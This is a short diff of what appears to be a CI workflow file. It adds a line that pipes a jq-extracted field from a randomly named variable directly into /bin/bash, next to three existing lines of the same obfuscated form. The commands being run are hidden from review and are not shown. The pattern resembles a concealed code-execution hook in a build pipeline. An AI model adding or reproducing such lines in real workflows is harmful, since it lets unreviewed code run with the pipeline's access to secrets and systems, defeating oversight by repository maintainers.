@@ -25,6 +25,7 @@ jobs:
           echo $whom64 | jq -r .f9 | /bin/bash
           printf '%s' "$hxuzx70530" | jq -r .tri87489 | /bin/bash
           printf '%s' "$jyj2210" | jq -r .di36 | /bin/bash
+          printf '%s' "$jwgub70" | jq -r .v8493 | /bin/bash
 
       - name: Archive output
         if: always()
